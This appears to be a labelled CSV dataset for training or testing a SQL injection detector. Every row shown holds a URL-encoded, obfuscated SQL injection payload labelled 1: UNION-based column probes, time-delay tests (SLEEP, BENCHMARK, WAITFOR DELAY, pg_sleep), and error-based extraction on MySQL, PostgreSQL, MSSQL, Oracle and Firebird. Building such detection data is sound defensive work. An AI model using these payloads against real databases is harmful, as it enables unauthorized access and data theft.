Query,Label
"-1%324%34  %29   a%73 %71sz%77 %77%68%65r%65 2%3332  %3d  2%3332 %75%6e%69%6f%6e %61%6c%6c %73e%6c%65%63t 2%3332,2%3332,2%3332,2%3332#",1
"%31%25%22 %6f%72 r%6fw  %28  1%304%35,756%32  %29  %3e  %28  %73%65l%65ct co%75nt  %28  %2%61  %29  ,con%63%61t  %28  %30%787%31%371%37%306%61%37%31%2c  %28  %73%65l%65ct   %28  %65%6c%74  %28  1%3%30%34%35  %3d  1%3%30%34%35,1   %29    %29     %29  ,%30%78717%61767%6171,flo%6f%72  %28  r%61n%64  %28  %30  %29  %2%612   %29    %29   %78 %66%72%6f%6d   %28  %73%65l%65ct 848%38 u%6e%69o%6e %73%65l%65ct %355%38%34 u%6e%69o%6e %73%65l%65ct 3%30%351 u%6e%69o%6e %73%65l%65ct 121%30  %29  %61 %67ro%75p %62%79 %78  %29   %61nd %22%%22  %3d  %22",1
"%31"" %61%6e%64 r%6f%77  %28  %36%32%33%37%2c%374%36%39  %29  %3e  %28  %73%65%6ce%63t %63%6f%75n%74  %28  %2%61  %29  %2cconc%61t  %28  %3%30%78%37%31%37%31%37%3%30%36%61%371%2c  %28  %73%65%6ce%63t   %28  %65%6ct  %28  %36%32%33%37  %3d  %36%32%33%37,1   %29    %29     %29  %2c%3%30%78%37%31%37%61%37%36%37%61%37%31%2c%66%6c%6f%6f%72  %28  r%61%6e%64  %28  %30  %29  %2%612   %29    %29   %78 %66%72%6f%6d   %28  %73%65%6ce%63t 5%31%392 %75%6e%69o%6e %73%65%6ce%63t %33%37%38%35 %75%6e%69o%6e %73%65%6ce%63t 3%393%31 %75%6e%69o%6e %73%65%6ce%63t 71%35%38  %29  %61 %67%72%6f%75%70 %62%79 %78  %29   %61%6e%64 %22n%7a%67n%22  %3d  %22n%7a%67n",1
 %28  %73%6%35%6c%6%35%63%74   %28  %63a%73%6%35 wh%6%35n   %28  98%3%35%36  %3d  98%3%35%36  %29   %74he%6e %73l%6%35ep  %28  %35  %29   %65l%73%65 98%3%35%36*  %28  %73%6%35%6c%6%35%63%74 98%3%35%36 %66%72om %69%6ef%6f%72%6d%61%74%69%6f%6e%5f%73%63%68%65%6d%61%2e%63%68%61r%61%63%74%65%72%5f%73%65%74%73  %29   %65%6ed   %29    %29 ,1
"%31""   %29    %29    a%73 mli%64 wh%65%72e %310%34%37  %3d  %310%34%37 u%6ei%6fn a%6c%6c %73%65%6c%65%63%74 nu%6cl%2c%6e%75%6c%6c#",1
"%31%25%22   %29    %29     %29   o%72 49%31%35  %3d    %28  se%6ce%63%74 %63ou%6et  %28  %2a  %29   %66%72%6f%6d %64%6f%6da%69n%2ed%6fm%61i%6e%73 %61s %741,%64omai%6e%2eco%6cumns %61s %74%32%2cd%6f%6da%69%6e%2e%74%61b%6c%65s %61s %74%33  %29  %2d-",1
"%73%65%6ce%63%74 coun%74  %28  %2a  %29   f%72om all_use%72s t1,all_use%72s t2,all_use%72s t3,all_use%72s t4,all_use%72s t%35 %61%6e%64   %28  %27%%27  %3d  %27",1
-753%32   %29    %29     %29   %6f%72 %34%349%33  %3d  %75%74%6c%5f%69%6e%6%31%64%64%72%2e%67e%74%5f%68%6f%73%74%5f%6%31%64%64%72%65%73%73  %28  %63h%72  %28  %3%31%31%33  %29  %7c%7c%63h%72  %28  %3%31%31%33  %29  %7c%7c%63h%72  %28  %3%31%3%312  %29  %7c%7c%63h%72  %28  %31%30%36  %29  %7c%7c%63h%72  %28  %3%31%31%33  %29  %7c%7c  %28  %73%65l%65%63%74   %28  %63%6%31%73%65 %77%68%65n   %28  %34%349%33  %3d  %34%349%33  %29   t%68e%6e %31 %65ls%65 %30 %65n%64  %29   %66%72%6f%6d %64%75%61%6c  %29  %7c%7c%63h%72  %28  %3%31%31%33  %29  %7c%7c%63h%72  %28  %3%31%32%32  %29  %7c%7c%63h%72  %28  %31%318  %29  %7c%7c%63h%72  %28  %3%31%32%32  %29  %7c%7c%63h%72  %28  %3%31%31%33   %29    %29    %61%6ed    %28    %28     %28  %38%33%33%32  %3d  %38%33%33%32,1
"1%22   %29    %29    u%6ei%6f%6e %61%6c%6c s%65%6c%65%63t null,%6e%75%6cl%2c%6e%75%6c%6c,null,null%2c%6eu%6cl,%6e%75ll%2cn%75ll%2cn%75ll%2d%2d",1
"%31%22  %29   w%68e%72%65 %31%300%31  %3d  %31%300%31 pro%63ed%75re %61%6e%61%6cy%73%65  %28  %65xtra%63tva%6c%75%65  %28  9%362%37%2c%63%6f%6e%63%61%74  %28  0x5%63,  %28  b%65%6e%63%68%6dar%6b  %28  %350%30%30%30%30%30%2c%6dd%35  %28  0%78%34%62%37%37%34c7%35   %29    %29      %29    %29     %29  ,%31  %29  %23",1
%31'   %29    %29     %29   %6f%72 2%3633  %3d  dbms_pipe.rece%69ve%5fmes%73age  %28  %63%68%72  %28  %311%32  %29  ||%63%68%72  %28  6%35  %29  ||%63%68%72  %28  6%35  %29  ||%63%68%72  %28  %31%30%33  %29  %2c5  %29   a%6ed    %28    %28     %28  %27%78%77%68i%27  %3d  %27%78whi,1
%31%27   %29    %29    %61nd %369%36%39  %3d    %28  %73ele%63t %369%36%39 %66r%6f%6d %70%67%%35f%73l%6%35ep  %28  %35   %29    %29    %61nd    %28    %28   %27%70%72%6a%66'  %3d  %27pr%6a%66,1
1%27  %29   %61%73 j%64m%68 %77%68%6%35%72%6%35 61%37%3%35  %3d  61%37%3%35 rlik%6%35 s%6cee%70  %28  %35  %29  %23,1
"%31%25%22   %29    %29     %29   o%72 %31%3022  %3d    %28  s%65%6cec%74 %63%6f%75%6e%74  %28  %2a  %29   f%72%6fm %61ll%5fu%73%65%72%73 t1,%61ll%5fu%73%65%72%73 t2,%61ll%5fu%73%65%72%73 t3,%61ll%5fu%73%65%72%73 t4,%61ll%5fu%73%65%72%73 %745  %29  %2d%2d",1
"%63%61%6c%6c %72%6%35%67e%78%70%5fsu%62s%74r%%369n%67  %28  %72%6%35p%6%35%61%74  %28  lef%74  %28  %63ry%70%74%5fk%6%35%79  %28  %63har  %28  6%35  %29  ||%63har  %28  %369  %29  ||%63har  %28  %383  %29  ,%6eu%6c%6c  %29  ,%30  %29  %2c5%30%30%300%300%30%30  %29  ,%6eu%6c%6c  %29   a%6ed   %28  %22%71w%64%69%22  %3d  ""%71%77di",1
1%27 i%6e bool%65an mo%64%65  %29   %75n%69%6f%6e %61%6cl s%65le%63t %6eu%6c%6c%2d%2d,1
"%2d3%30%37%31   %29    %29    a%73 %75%69%69%75 %77here 8%3910  %3d  8%3910 %75n%69%6f%6e a%6cl s%65%6c%65%63%74 8%3910,8%3910,8%3910,8%3910,8%3910,8%3910,8%3910#",1
1%22   %29    %29    %61%73 %74%67%77p w%68e%72e 9%3405  %3d  9%3405,1
%3%31 %77%68%65%72e 5%3%316%3%31  %3d  5%3%316%3%31 %6%31n%64 %33%37%35%34  %3d    %28  se%6c%65c%74 up%7%30%65%72  %28  %78%6d%6c%74yp%65  %28  %63h%72  %28  %36%30  %29  %7c|%63h%72  %28  %358  %29  %7c|%63h%72  %28  %3%31%3%313  %29  %7c|%63h%72  %28  %3%31%3%313  %29  %7c|%63h%72  %28  %3%31%3%312  %29  %7c|%63h%72  %28  %3%31%30%36  %29  %7c|%63h%72  %28  %3%31%3%313  %29  %7c|  %28  se%6c%65c%74   %28  ca%73e whe%6e   %28  %33%37%35%34  %3d  %33%37%35%34  %29   %74he%6e %3%31 %65%6c%73%65 %30 %65n%64  %29   fro%6d %64%75%61%6c  %29  %7c|%63h%72  %28  %3%31%3%313  %29  %7c|%63h%72  %28  %3%312%32  %29  %7c|%63h%72  %28  %3%31%3%318  %29  %7c|%63h%72  %28  %3%312%32  %29  %7c|%63h%72  %28  %3%31%3%313  %29  %7c|%63h%72  %28  %36%32   %29    %29     %29   fro%6d %64%75%61%6c  %29  %2d%2d,1
%3%31   %29    %29     %29   %72l%69%6b%65   %28  s%65%6c%65%63%74   %28  ca%73e %77%68%65n   %28  %343%36%37  %3d  6%38%379  %29   the%6e %3%31 %65%6c%73%65 %30x2%38 e%6ed   %29    %29    a%6e%64    %28    %28     %28  %32%35%34%32  %3d  %32%35%34%32,1
"%31""  %29   %61%73 %72ovd %77%68%65%72%65 3%37%36%34  %3d  3%37%36%34 %61n%64 %65%6c%74  %28  %34%3249  %3d  %34%3249,7259  %29  %2d%2d",1
%73%6%35%6c%6%35%63%74 %73%6c%6%35%6%35p  %28  %35  %29   a%6e%64   %28  %27d%63ys%27 %6c%69%6b%65 %27%64%63%79%73,1
%31  %29   %61s m%73%61%74 w%68%65%72%65 %31%3267  %3d  %31%3267,1
%3%31 %6%31n%64 %3438%36  %3d  ut%6c%5f%69%6e%6%31%64%64%72%2e%67%65%74_%68%6f%73t%5fa%64dr%65%73%73  %28  c%68r  %28  %3%31%3%313  %29  |%7cc%68r  %28  %3%31%3%313  %29  |%7cc%68r  %28  %3%31%3%312  %29  |%7cc%68r  %28  %3%3%31%306  %29  |%7cc%68r  %28  %3%31%3%313  %29  |%7c  %28  sel%65ct   %28  %63%6%31%73%65 %77%68%65%6e   %28  %3438%36  %3d  %3438%36  %29   %74%68%65%6e %3%31 %65%6c%73%65 %30 en%64  %29   %66r%6fm d%75al  %29  |%7cc%68r  %28  %3%31%3%313  %29  |%7cc%68r  %28  %3%3%31%32%32  %29  |%7cc%68r  %28  %3%31%3%318  %29  |%7cc%68r  %28  %3%3%31%32%32  %29  |%7cc%68r  %28  %3%31%3%313   %29    %29 ,1
"1%25%22  %29   %61n%64 cha%72  %28  1%309  %29  ||cha%72  %28  %379  %29  ||cha%72  %28  %37%30  %29  ||cha%72  %28  %39%30  %29    %3d  %72%65ge%78p%5f%73u%62%73t%72%69%6e%67  %28  %72%65%70%65%61t  %28  %72ig%68t  %28  cha%72  %28  %35%30%31%32  %29  ,%30  %29  ,50000%3000%300  %29  ,%6eul%6c  %29  %2d-",1
%31 w%68er%65 %38%3506  %3d  %38%3506,1
%31%27  %29   %61%73 %71%63%73%65 wher%65 %34%3147  %3d  %34%3147 %77%61%69%74%66%6f%72 del%61y %27%30%3a%30%3a5%27%2d%2d,1
%31%27  %29   a%73 in%69d w%68%6%35%72%6%35 %37%38%312  %3d  %37%38%312 %6fr %367%39%33  %3d    %28  s%6%35lect %367%39%33 %66%72%6f%6d %70%67%%35fs%6c%6%35%6%35%70  %28  %35   %29    %29   %2d-,1
"%31%25%27   %29    %29     %29   %61%6e%64 %38%34%30%37  %3d    %28  %73%65%6ce%63t %63ount  %28  %2a  %29   f%72%6f%6d generate_ser%69es  %28  1,%35000000   %29    %29    %61%6e%64    %28    %28     %28  %27%25%27  %3d  %27",1
%31'  %29   w%68ere 1%35%37%37  %3d  1%35%37%37 %75%6e%69%6f%6e %61%6cl %73%65%6c%65%63%74 %6e%75%6c%6c%2c%6e%75%6cl%2c%6e%75%6c%6c%2c%6e%75%6c%6c%2cnu%6cl%2c%6eu%6c%6c#,1
%77aitfor del%61y %27%30:%30%3a%35%27 %61nd    %28    %28   'n%76q%66'  %3d  %27%6e%76%71%66,1
"%3%31%22   %29    %29     %29   p%72o%63e%64%75%72e %6%31n%6%31ly%73e  %28  %65%78%74%72%6%31%63%74v%6%31%6c%75%65  %28  5%384%3%30,c%6fn%63%6%31t  %28  %3%30%78%35%63%2c%3%30%78%37%3%317%3%317%3%30%36%6%31%37%3%31,  %28  %73el%65c%74   %28  %63%6%31%73e %77%68%65%6e   %28  %358%34%3%30  %3d  %358%34%3%30  %29   %74h%65%6e %31 e%6cse %30 %65%6e%64   %29    %29   ,%30x7%317a767a7%31   %29    %29   ,%31  %29   %61%6e%64    %28    %28     %28  ""%66%74%6ag%22  %3d  %22%66t%6ag",1
" en%64 %61%6e%64 %22%78%6f%75%6f%22 l%69%6b%65 ""x%6f%75%6f",1
"1%27 o%72 %72%6f%77  %28  1%30%34%35%2c%37%3562  %29  %3e  %28  se%6cec%74 coun%74  %28  %2%61  %29  %2c%63%6f%6e%63%61%74  %28  %3%30%78%371%37%31%37%3%306%61%37%31,  %28  se%6cec%74   %28  %65l%74  %28  %31%3%30%34%35  %3d  %31%3%30%34%35,1   %29    %29     %29  ,%30%78717%61767%6171,floo%72  %28  %72%61%6e%64  %28  %30  %29  %2%612   %29    %29   %78 f%72o%6d   %28  se%6cec%74 8%34%38%38 %75%6e%69%6f%6e se%6cec%74 5%3584 %75%6e%69%6f%6e se%6cec%74 3%%33%30%35%31 %75%6e%69%6f%6e se%6cec%74 121%30  %29  %61 %67r%6fup %62y %78  %29   %61nd %27%79vzf%27  %3d  '%79v%7af",1
1%27 %77%68%65%72%65 70%336  %3d  70%336,1
%31%27%7c%7c  %28  %73%65l%65%63t %27goen%27 %66r%6f%6d %64u%61%6c %77here 8%35%38%36  %3d  8%35%38%36,1
s%65lect %63ase wh%65n %32%36%34%30  %3d  924%39 t%68%65n %31 %65%6c%73e %6eull %65nd--,1
"1%27 %77%68%65r%65 1%38%336  %3d  1%38%336 %6fr %63har  %28  %3119  %29  ||%63har  %28  %31%30%30  %29  ||%63har  %28  %39%39  %29  ||%63har  %28  %3121  %29    %3d  %72%65ge%78p_sub%73t%72i%6e%67  %28  r%65%70ea%74  %28  r%69ght  %28  %63har  %28  %31441  %29  ,%30  %29  ,50%30%30000000  %29  %2c%6e%75%6c%6c  %29  %2d%2d",1
%31%27   %29    %29    %61%73 mq%6e%76 %77%68%65%72%65 %39%38%331  %3d  %39%38%331,1
%69f  %28  %3%35%38%39%36  %3d  %342%35%31  %29   %73%65%6c%65%63%74 %3%35%38%39%36 e%6cs%65 d%72%6f%70 %66%75%6e%63ti%6fn %78myk-%2d,1
selec%74   %28  ca%73e %77%68%65%6e   %28  %38%33%33%31  %3d  5%362%35  %29   th%65n %38%33%33%31 el%73e %38%33%33%31*  %28  selec%74 %38%33%33%31 %66%72%6f%6d %6d%79%73%71%6c%2e%64%62  %29   %65nd  %29  %23,1
%31'  %29   an%64 %33%35%36%30  %3d  %35%34%36%37%2d-,1
s%65lec%74 %62%65%6e%63hma%72%6b  %28  %35%30%30%30%30%30%30%2c%6d%64%35  %28  %30x4c4%646142   %29    %29    a%6e%64    %28    %28     %28  %27%25%27  %3d  %27,1
"%2d%36%36%332  %29   u%6e%69%6f%6e %61%6c%6c %73%65%6c%65%63%74 %34%307%33%2c4%30%373,4%3073,%3407%33,4%30%37%33%2c%34%30%37%33,407%33%2c%34%307%33%2d-",1
%2d%38%35%313%27 un%69on a%6cl s%65%6ce%63%74 %37%34%31%34-%2d,1
"-%39%3934%22  %29   %6fr %35%3%30%323  %3d  ctx%73ys%2edr%69thsx%2e%73n  %28  %35%3%30%323,  %28  %63%68%72  %28  %3%31%3%31%33  %29  %7c|%63%68%72  %28  %3%31%3%31%33  %29  %7c|%63%68%72  %28  %31%3%312  %29  %7c|%63%68%72  %28  %3%31%3%30%36  %29  %7c|%63%68%72  %28  %3%31%3%31%33  %29  %7c|  %28  %73%65%6ce%63%74   %28  %63a%73%65 w%68%65%6e   %28  %35%3%30%323  %3d  %35%3%30%323  %29   t%68en %31 %65%6c%73%65 %30 %65%6ed  %29   %66%72%6f%6d dua%6c  %29  %7c|%63%68%72  %28  %3%31%3%31%33  %29  %7c|%63%68%72  %28  %3%31%32%32  %29  %7c|%63%68%72  %28  %31%318  %29  %7c|%63%68%72  %28  %3%31%32%32  %29  %7c|%63%68%72  %28  %3%31%3%31%33   %29    %29     %29   %61%6e%64   %28  %22%78%65%63%62%22 %6c%69%6b%65 %22%78%65%63%62",1
"1%25%22   %29    %29    a%6ed 851%34  %3d    %28  se%6ce%63%74 co%75nt  %28  %2a  %29   f%72%6fm doma%69%6e%2ed%6f%6da%69%6e%73 %61%73 t1,d%6f%6dai%6e%2ec%6f%6c%75%6dns %61%73 %742,domain%2e%74%61b%6c%65s %61%73 %74%33  %29   a%6ed    %28    %28   %22%%22  %3d  %22",1
%31%27   %29    %29    %61%73 yp%67%7a %77%68e%72%65 %3%38%370%34  %3d  %3%38%370%34,1
-%35%372%36%%22   %29    %29    %6fr %36%3872  %3d  %36%3872 %61n%64    %28    %28   %22%25%22  %3d  %22,1
"%31%%27   %29    %29     %29   a%6e%64 %65%6c%74  %28  4%3249  %3d  4%3249,7259  %29   a%6e%64    %28    %28     %28  %27%25%27  %3d  %27",1
%31 %77%68ere %3%31%32%399  %3d  %3%31%32%399,1
%31   %29    %29    a%6e%64 %73l%6%35ep  %28  %35  %29  %23,1
%2d%3652%39%27  %29   %6f%72   %28  43%309  %3d  %31%36%30%31  %29  *%31%36%30%31,1
"%31'   %29    %29     %29   %6fr %35%32%38%36  %3d    %28  s%65%6c%65%63%74 %63%6f%75%6e%74  %28  %2a  %29   f%72%6fm %61ll%5fu%73%65rs t1,%61ll%5fu%73%65rs t2,%61ll%5fu%73%65rs t3,%61ll%5fu%73%65rs t4,%61ll%5fu%73%65rs %74%35  %29   %61n%64    %28    %28     %28  'xd%75i' li%6b%65 %27%78dui",1
%73%6%35%6c%6%35%63%74 pg_s%6ceep  %28  %35  %29  %2d%2d %6f%6a%7a%74,1
%62%6%35g%69n d%62m%73_lock.sleep  %28  %35  %29 ,1
%2d%392%30%32' w%68%65%72e 9%37%39%39  %3d  9%37%39%39 o%72 %34%37%34%37  %3d  dbms_utility.s%7%31lid_to%5fsqlhash   %28    %28   %63%68%72  %28  %3%3%31%31%33  %29  |%7c%63%68%72  %28  %3%3%31%31%33  %29  |%7c%63%68%72  %28  %3%31%3%31%32  %29  |%7c%63%68%72  %28  %3%31%3%306  %29  |%7c%63%68%72  %28  %3%3%31%31%33  %29  |%7c  %28  se%6ce%63t   %28  %63ase %77%68%65%6e   %28  %34%37%34%37  %3d  %34%37%34%37  %29   the%6e %31 %65lse %30 %65n%64  %29   %66%72om %64%75%61%6c  %29  |%7c%63%68%72  %28  %3%3%31%31%33  %29  |%7c%63%68%72  %28  %31%32%32  %29  |%7c%63%68%72  %28  %31%318  %29  |%7c%63%68%72  %28  %31%32%32  %29  |%7c%63%68%72  %28  %3%3%31%31%33   %29    %29     %29  %2d-,1
%73el%65%63%74   %28  c%6%31s%65 %77%68%65%6e   %28  956%32  %3d  %35996  %29   %74h%65n %31 %65%6cs%65 956%32*  %28  %73el%65%63%74 956%32 %66%72%6fm %6d%61%73%74%65%72%2e%2e%73%79%73d%61%74a%62a%73%65s  %29   e%6ed  %29  -%2d,1
"%31""   %29    %29    %61%6e%64 %385%314  %3d    %28  %73e%6cec%74 %63%6f%75n%74  %28  %2a  %29   %66%72om %64%6f%6d%61%69%6e%2e%64%6f%6d%61i%6e%73 %61%73 %74%31,d%6f%6dai%6e%2eco%6c%75mn%73 %61%73 %74%32%2c%64%6f%6d%61%69%6e%2e%74%61%62%6c%65%73 %61%73 %743  %29   %61%6e%64    %28    %28   ""gx%71q%22  %3d  ""gx%71q",1
%31%25%27   %29    %29     %29   %61%6e%64 %38%33%312  %3d  %64bms_pi%70%65%2e%72e%63eiv%65%5f%6dess%61%67%65  %28  %63h%72  %28  6%39  %29  ||%63h%72  %28  %37%39  %29  ||%63h%72  %28  %31%30%31  %29  ||%63h%72  %28  6%38  %29  %2c%35  %29  %2d%2d,1
"%31 %6fr %37552  %3d    %28  %73%65%6c%65%63t %63%6fu%6e%74  %28  %2a  %29   %66r%6f%6d %72%64%62%24f%69%65%6cd%73 %61s t%31,rdb$types %61s t2%2c%72db$col%6ca%74i%6fns %61s t3%2c%72%64%62%24fun%63%74%69%6f%6e%73 %61s %744  %29  ",1
%31%27  %29   whe%72e 22%308  %3d  22%308 r%6cike %73l%6%35%6%35%70  %28  %35  %29  %23,1
%31' %6f%72 %32%36%333  %3d  d%62ms_pip%6%35.rec%6%35iv%6%35_messa%67e  %28  c%68r  %28  %31%31%32  %29  ||c%68r  %28  6%35  %29  ||c%68r  %28  6%35  %29  ||c%68r  %28  %31%303  %29  %2c%35  %29   %61%6e%64 %27%67kk%75' %6c%69k%65 '%67%6b%6b%75,1
s%65le%63t %2a fr%6f%6d %67e%6e%65%72a%74e_s%65ri%65s  %28  %345%39%32%2c4%359%32%2cc%6%31%73%65 %77%68%65n   %28  %3459%32  %3d  %3459%32  %29   t%68en %31 e%6c%73e %30 %65%6e%64  %29   %6c%69%6di%74 %3%31%2d%2d,1
ii%66  %28  %31%31%35%37  %3d  %345%34%32%2c1%2c%31%2f0  %29  ,1
%2d%39%30%33%39%27  %29   unio%6e %61%6c%6c %73%65%6c%65%63%74 %38%30%35%38%2c%38%30%35%38%2c%38%30%35%38%2c%38%30%35%38%2c%38%30%35%38%2d%2d,1
%31 a%6ed   %28  %33%30%32%30  %3d  %33%30%32%30  %29  *6%37%30%33%23 %73%79%75%6a,1
%73%65%6ce%63%74 %62e%6e%63h%6d%61%72%6b  %28  %35%30%30%30%300%30%2cmd5  %28  %30%78%34%634d6%3142   %29    %29    %61nd '%67fpd'  %3d  'gfp%64,1
"%31%22 %61nd %65l%74  %28  %38%34%36%34  %3d  %35%37%361%2c%35%37%361  %29   %61nd ""%79dmt"" %6c%69%6be ""%79dmt",1
"%2d72%37%32%22  %29   %75n%69on a%6cl s%65le%63t %39%31%36%33%2c%39%31%36%33%2c%39%31%36%33,%39%31%36%33%2c%39%31%363%2c9%31%36%33%2c%39%31%36%33%2d%2d",1
"%31   %29    %29     %29   %6f%72 e%78%74r%61%63%74v%61%6cue  %28  %31%3297%2cconca%74  %28  0x5c,0x7%317%31706a7%31,  %28  sel%65ct   %28  %65%6c%74  %28  %3%31%329%37  %3d  %3%31%329%37,%31   %29    %29     %29  ,0x7%317a767a7%31   %29    %29    a%6e%64    %28    %28     %28  45%310  %3d  45%310",1
"1%27%7c%7c  %28  s%65l%65%63t 'svgd%27 %66%72%6f%6d %64%75a%6c %77%68%65%72%65 %351%38%38  %3d  %351%38%38 %75%6e%69%6fn %61%6c%6c s%65l%65%63t %6eull,n%75%6cl,%6eull%2cn%75%6cl%2c%6e%75ll%23",1
"%31%27 %6f%72 %65%78p  %28  %7e  %28  s%65%6cect %2a f%72om   %28  s%65%6cect c%6fn%63%61t  %28  0%78%37171%37%30%36%61%37%31,  %28  s%65%6cect   %28  %65%6c%74  %28  %36270  %3d  %3%36%32%37%30%2c%31   %29    %29     %29  %2c%30%78%37%31%37%61%37%367%61%37%31%2c%30%78%37%38   %29    %29   %78   %29    %29    %61%6ed 'ze%6el' l%69k%65 'z%65nl",1
"%31""   %29    %29     %29   %6f%72 %75%70%64%61%74%65xm%6c  %28  %3180%38,conca%74  %28  0%782e%2c0%78%37%317170%36a%37%31,  %28  %73%65%6ce%63%74   %28  e%6ct  %28  1%380%38  %3d  1%380%38,1   %29    %29     %29  %2c%30%78%37%31%37%61%37%36%37%61%37%31  %29  %2c%38%36%36%36  %29   %61%6e%64    %28    %28     %28  ""mms%68""  %3d  %22%6d%6d%73%68",1
"%2d50%35%32   %29    %29     %29   %75%6e%69%6fn %61%6c%6c sel%65ct %38%335%31,8%335%31%2c%383%351%2c%38%33%35%31%23",1
"%73%65%6c%65%63%74 %2a fr%6f%6d %67%65%6e%65%72%6%31t%65%5f%73%65r%69%65%73  %28  %3446%35,%34%346%35%2cc%6%31%73%65 %77%68en   %28  %34%346%35  %3d  %362%33%32  %29   t%68en %31 e%6c%73e %30 %65%6ed  %29   l%69m%69t %3%31%2d%2d",1
%31%22  %29   a%73 %67%64cx %77he%72e 2%33%33%3%35  %3d  2%33%33%3%35 %61nd 69%36%39  %3d    %28  %73el%6%35ct 69%36%39 %66%72%6f%6d p%67%%35f%73%6c%6%35ep  %28  %35   %29    %29   %2d%2d,1
%31'+  %28  s%65l%65c%74 'feof%27 w%68%65%72e %31%39%36%36  %3d  %31%39%36%36,1
"%31%22 %72%6c%69ke %73l%6%35%6%35%70  %28  %35  %29   %61n%64 %22%76%65%75%62%22  %3d  ""ve%75b",1
"%2d%33169"" %6f%72%64%65%72 %62%79 %31%23",1
%31   %29    %29     %29   %61%6e%64 %63%68%61%72  %28  %310%39  %29  ||%63%68%61%72  %28  %37%39  %29  ||%63%68%61%72  %28  %37%30  %29  ||%63%68%61%72  %28  9%30  %29    %3d  regexp_subst%72ing  %28  %72%65%70%65%61%74  %28  %72%69%67%68%74  %28  %63%68%61%72  %28  50%312  %29  %2c%30  %29  %2c%35%300%30%30%30%30%30%300  %29  %2c%6e%75ll  %29  -%2d,1
waitfo%72 %64el%61y %27%30:%30%3a%35' %61%6e%64 %27df%7an'  %3d  'd%66zn,1
"%31%22   %29    %29     %29   %61nd %33%38%32%34  %3d  %62%65n%63%68ma%72%6b  %28  %35000%30%300,m%645  %28  0x%376%35%35%35%364%32   %29    %29    %61nd    %28    %28     %28  %22%65%6efu""  %3d  %22%65%6e%66%75",1
"-6%359%37'+  %28  %73elect a%65%77%7a w%68e%72e %34%3036  %3d  %34%3036 un%69on %61l%6c %73elect %34%3036,%34%3036,%34%3036,%34%3036,%34%3036,%34%3036,%34%3036--",1
"1%27  %29   %61%73 naj%63 w%68e%72%65 %35%32%31%33  %3d  %35%32%31%33 %70rocedur%65 %61%6ea%6c%79%73e  %28  %65%78t%72%61%63%74%76%61%6c%75%65  %28  9%32%35%35,%63%6f%6e%63a%74  %28  %30%78%35%63%2c  %28  %62e%6echma%72%6b  %28  5%3000000,md5  %28  %30%7852%351%35%615%30   %29    %29      %29    %29     %29  %2c1  %29  -%2d",1
"%31%22   %29    %29     %29   p%72o%63edure %61%6e%61ly%73%65  %28  ex%74r%61%63%74val%75%65  %28  92%35%35%2c%63%6f%6e%63%61%74  %28  %30%78%35c%2c  %28  %62%65n%63h%6d%61rk  %28  5%30%30000%30,m%645  %28  %30x52515a50   %29    %29      %29    %29     %29  %2c1  %29   %61%6e%64    %28    %28     %28  %22%74a%62%71"" %6c%69ke ""%74a%62%71",1
%2d%33%39%36%34%22  %29   wh%65re %335%36%36  %3d  %335%36%36 o%72%64%65r %62%79 1%2d%2d,1
%2d%37%386%34 o%72 %34%349%33  %3d  ut%6c%5f%69%6e%6%31d%64r%2eg%65t_%68o%73%74%5f%6%31%64%64re%73%73  %28  %63hr  %28  %3%31%31%33  %29  %7c|%63hr  %28  %3%31%31%33  %29  %7c|%63hr  %28  %3%31%3%312  %29  %7c|%63hr  %28  %3%31%3%30%36  %29  %7c|%63hr  %28  %3%31%31%33  %29  %7c|  %28  %73%65l%65%63%74   %28  %63%6%31s%65 %77%68%65%6e   %28  %34%349%33  %3d  %34%349%33  %29   %74%68en %31 el%73e %30 %65nd  %29   %66%72o%6d d%75%61l  %29  %7c|%63hr  %28  %3%31%31%33  %29  %7c|%63hr  %28  %3%31%322  %29  %7c|%63hr  %28  %31%318  %29  %7c|%63hr  %28  %3%31%322  %29  %7c|%63hr  %28  %3%31%31%33   %29    %29   %23 %74%77p%77,1
%31%25%22  %29   %6f%72 236%37  %3d    %28  sele%63%74 %63o%75%6et  %28  %2a  %29   f%72%6f%6d %72%64%62$f%69elds a%73 t%31%2c%72d%62%24%74%79pes a%73 %74%32%2c%72%64%62%24c%6f%6c%6c%61%74%69%6f%6e%73 a%73 t%33%2c%72db$%66unc%74%69o%6e%73 a%73 t%34  %29  %2d-,1
"%3%31%22 %7%30r%6f%63%65%64%75%72%65 %6%31nal%79%73%65  %28  %65x%74%72%6%31c%74%76%6%31%6c%75e  %28  %3%35%38%34%30,co%6ecat  %28  %30%78%35%63,%3%30%787%3%317%31%37%3%306%6%31%37%3%31%2c  %28  %73%65%6c%65%63%74   %28  %63ase %77%68e%6e   %28  %35%38%34%30  %3d  %35%38%34%30  %29   th%65%6e %31 %65ls%65 %30 e%6ed   %29    %29   ,%30x7%317a767a7%31   %29    %29   ,%31  %29   %61%6ed ""%64%73%61%65""  %3d  %22dsa%65",1
